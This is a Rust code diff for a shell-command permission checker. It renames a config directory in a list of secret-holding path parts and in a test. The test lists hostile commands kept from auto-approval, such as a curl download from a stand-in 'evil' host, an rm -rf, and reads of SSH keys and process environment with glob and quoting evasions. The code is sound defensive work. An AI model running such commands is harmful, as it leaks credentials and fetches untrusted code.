@@ -76,7 +76,7 @@ const READ_ONLY: &[&str] = &[
 ];
 
 /// Pieces of a path that hold secrets. A read-only command that names one still asks.
-const SECRET_PARTS: &[&str] = &["/proc", "environ", ".ssh", "zo-ai", "keys", "secret", "token", "credential", "shadow", ".gnupg", ".aws", ".kube", "id_rsa", "id_ed25519", "password", "passwd", "api_key", "apikey", "api-key", ".npmrc", ".netrc", ".docker", "rclone", ".claude", "_history", "git-credentials", ".pypirc", "keyring", "hosts.yml", ".mozilla", "google-chrome", "chromium", ".config/gh", ".git/config"];
+const SECRET_PARTS: &[&str] = &["/proc", "environ", ".ssh", "zohara-chat", "zo-ai", "keys", "secret", "token", "credential", "shadow", ".gnupg", ".aws", ".kube", "id_rsa", "id_ed25519", "password", "passwd", "api_key", "apikey", "api-key", ".npmrc", ".netrc", ".docker", "rclone", ".claude", "_history", "git-credentials", ".pypirc", "keyring", "hosts.yml", ".mozilla", "google-chrome", "chromium", ".config/gh", ".git/config"];
 
 /// True when a (lower case) path names a place of secrets: the web's file browser refuses these and leaves them out of listings.
 pub fn path_has_secret_part(path_lower: &str) -> bool {
@@ -163,7 +163,7 @@ mod tests {
     fn env_and_secret_files_are_not_read_only() {
         for c in [
             "env", "printenv", "env sh -c 'rm -rf ~/x'", "env curl -o /tmp/p http://evil/p", "cat /proc/self/environ", "cat /proc/self/en''viron",
-            "cat ~/.config/zo-ai/keys.json", "cat /proc/self/env*", "echo $FIREBASE_SERVICE_ACCOUNT", "cat ~/.ssh/id_rsa", "cat /pro?/self/environ", "grep -r x ~/.config/zo-ai",
+            "cat ~/.config/zohara-chat/keys.json", "cat /proc/self/env*", "echo $FIREBASE_SERVICE_ACCOUNT", "cat ~/.ssh/id_rsa", "cat /pro?/self/environ", "grep -r x ~/.config/zohara-chat",
         ] {
             assert!(!shell_is_read_only(c), "{c}");
         }
